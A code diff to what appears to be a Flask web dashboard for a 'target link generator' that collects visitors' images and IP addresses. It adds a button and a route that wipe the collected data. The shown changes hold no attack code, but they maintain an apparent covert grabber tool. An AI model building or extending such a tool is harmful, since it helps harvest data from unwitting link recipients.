@@ -199,6 +199,7 @@ audio{width:100%;height:30px;filter:invert(1);}
   <h4>> TARGET LINK GENERATOR</h4>
   <input type="text" id="rawLink" class="gen-input" readonly>
   <button class="gen-btn" onclick="copyLink()">Copy Link Target</button>
+  <button class="gen-btn" style="background: #ff003c; color: #fff; margin-top: 10px;" onclick="clearData()">HAPUS SEMUA DATA</button>
 </div>
 
 <div id="list"><p style="text-align:center;color:var(--cyan)">> SCANNING FOR PACKETS..._</p></div>
@@ -212,6 +213,14 @@ function copyLink() {
   const copyText = document.getElementById("rawLink");
   navigator.clipboard.writeText(copyText.value);
   alert("Link Target dicopy!");
+}
+
+async function clearData() {
+  if(confirm("Yakin mau hapus semua data gambar dan IP?")) {
+    await fetch('/api/clear', {method: 'POST'});
+    tick(); // Refresh tampilan
+    alert("Data berhasil dihapus!");
+  }
 }
 
 const socket = io();
@@ -309,6 +318,11 @@ def submit():
 
 @app.route("/api/data")
 def get_data(): return jsonify(get_db())
+
+@app.route("/api/clear", methods=['POST'])
+def clear_data():
+    save_db([]) # Reset database jadi kosong
+    return jsonify({"status": "cleared"})
 
 @socketio.on('live_data')
 def handle_live_data(data):
